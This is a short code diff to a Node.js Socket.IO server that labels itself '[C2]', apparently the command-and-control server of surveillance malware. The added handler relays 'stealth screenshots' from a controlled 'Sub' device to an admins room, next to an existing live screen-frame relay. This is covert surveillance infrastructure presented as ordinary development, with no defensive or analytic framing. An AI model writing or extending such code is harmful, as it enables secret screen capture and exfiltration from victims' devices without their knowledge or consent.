@@ -104,6 +104,11 @@ io.on('connection', (socket) => {
         io.to('admins').emit('screen_frame', data);
     });
 
+    // Relay stealth screenshots from Sub to Admin
+    socket.on('incoming_screenshot', (data) => {
+        io.to('admins').emit('incoming_screenshot', data);
+    });
+
     socket.on('disconnect', () => {
         console.log(`[C2] Disconnected: ${socket.id}`);
         if (connectedDevices[socket.id]) {
